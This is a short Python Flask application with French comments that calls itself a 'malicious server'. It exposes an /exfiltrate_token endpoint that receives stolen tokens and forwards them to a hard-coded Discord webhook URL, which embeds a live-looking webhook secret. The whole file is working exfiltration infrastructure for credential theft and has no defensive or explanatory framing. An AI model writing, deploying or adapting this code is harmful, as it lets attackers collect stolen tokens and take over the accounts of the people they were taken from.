from flask import Flask, request
import requests  # Pour envoyer une requête HTTP POST
import os

app = Flask(__name__)

# URL du webhook Discord (remplace par ton URL de webhook Discord)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1364570609660596224/X3No5apOrEAdUx-3Xu0W7QLg3q1vMwX0A_VXvXJ-De5UqljDVSkUAI4T9hf5cfRGgrtA"

@app.route('/')
def home():
    return "Bienvenue sur mon serveur malveillant !"

@app.route('/exfiltrate_token', methods=['POST'])
def exfiltrate_token():
    token = request.json.get('token')  # Récupère le token envoyé par la requête HTTP
    if token:
        # Crée le contenu du message à envoyer sur Discord
        message = {
            "content": f"Token récupéré : {token}"
        }

        # Envoie le message via une requête POST au webhook Discord
        response = requests.post(DISCORD_WEBHOOK_URL, json=message)

        # Vérifie si la requête a réussi
        if response.status_code == 204:
            return "Token envoyé avec succès au Webhook Discord !"
        else:
            return "Erreur lors de l'envoi au Webhook Discord.", 500
    else:
        return "Aucun token reçu.", 400

if __name__ == '__main__':
    app.run(debug=True)
